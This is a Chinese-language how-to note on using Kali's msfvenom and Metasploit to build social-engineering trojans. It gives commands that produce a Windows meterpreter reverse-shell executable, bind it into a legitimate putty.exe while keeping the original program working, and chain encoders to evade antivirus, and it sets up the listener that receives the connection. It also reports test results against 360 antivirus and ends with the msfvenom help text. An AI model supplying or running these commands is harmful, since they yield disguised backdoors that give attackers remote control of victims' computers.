# kali msf社工伪造exe

* 注：kali中已经将msfpayload和msfencode整合到msfvenom中

## 普通后面

* 查找需要的载荷
```
#msfvenom -l payload|grep windows|grep reverse_tcp|grep meterpreter
```
* 生成exe
```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.131 LPORT=443 -f exe -o payload.exe
```
* 启动监听
```
msf>use exploit/multi/handler
>set payload windows/meterpreter/reverse_tcp
>set LHOST 192.168.10.131
>set LPORT 443
>run
```
* 点击exe后，建立起连接

## 将payload和正常的exe捆绑，并做免杀

```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.131 LPORT=443 -e x86/shikata_ga_nai -x putty.exe -i 5 -f  exe -o backdoor.exe
```
* -e x86/shikata_ga_nai 此意为使用shikata_ga_nai的编码方式对攻击载荷进行重新编码
* -x te_dinig.exe 此意为将木马绑定到指定的可执行程序上
* -i 5 使用指定的编码方式对目标进行5此编码
* -f 使用msf编码输出格式为exe

* 启动监听
```
msf>use exploit/multi/handler
>set payload windows/meterpreter/reverse_tcp
>set LHOST 192.168.10.131
>set LPORT 443
>run
```
* 点击exe后，建立起连接
* 注：测试中，捆绑的exe本身没有起来，但是连接创建成功，这样感觉效果不是很好
* 注：上述方式编码后，360还是可以查杀的。不管有木有编码，从虚拟机拷贝到电脑后，如果没有手动去扫描，点击运行后，360没有任何反应，正常上线。搭建个http服务下载该exe，360还提示文件安全...

```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.131 LPORT=443 -e x86/shikata_ga_nai -x putty.exe -k -i 5 -f  exe -o backdoor.exe
```
* 注：加了个-k （keep的意思），将保留原exe的功能，这样很隐蔽

* 网友说结合veil可以实现免杀，待测试TODO

## 串联编码
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.131 LPORT=443  -e x86/shikata_ga_nai -i 5 -f raw|\ 
msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw |\
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```
* 还是能查杀

## 快速脚本

将执行的命令写到一个文件里面，然后msfconsole -r xxx 即可。推荐用.msf后缀

## msfvenom帮助
```
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --smallest                   Generate the smallest possible payload using all available encoders
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, thus performing a subtraction to prepend a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```